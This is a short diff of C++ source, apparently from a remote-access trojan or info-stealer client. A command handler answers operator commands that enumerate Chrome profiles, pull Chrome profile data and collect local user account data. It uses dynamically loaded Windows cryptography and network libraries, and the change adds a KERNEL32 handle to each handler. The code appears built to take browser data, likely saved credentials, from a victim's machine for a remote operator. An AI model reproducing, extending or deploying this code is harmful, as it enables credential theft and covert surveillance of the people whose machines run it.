@@ -911,7 +911,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::INF_Chrome_Profiles) {
         if (this->mod_Inf0 == nullptr) {
             this->mod_dynamic->LoadInfoProcs();
-            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32);
+            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32, this->mod_dynamic->KERNEL32);
         }
         std::string strPaquete = "N/A";
         std::vector<Chrome_Profile> vcProfiles = this->mod_Inf0->m_ChromeProfiles();
@@ -943,7 +943,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::INF_Chrome_Profile_Data) {
         if (this->mod_Inf0 == nullptr) {
             this->mod_dynamic->LoadInfoProcs();
-            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32);
+            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32, this->mod_dynamic->KERNEL32);
         }
         strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
         if (strIn.size() == 2) {
@@ -963,7 +963,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::INF_Users) {
         if (this->mod_Inf0 == nullptr) {
             this->mod_dynamic->LoadInfoProcs();
-            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32);
+            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32, this->mod_dynamic->KERNEL32);
         }
         std::string strPaquete = this->mod_Inf0->m_GetUsersData();
         if (strPaquete.size() > 6) {
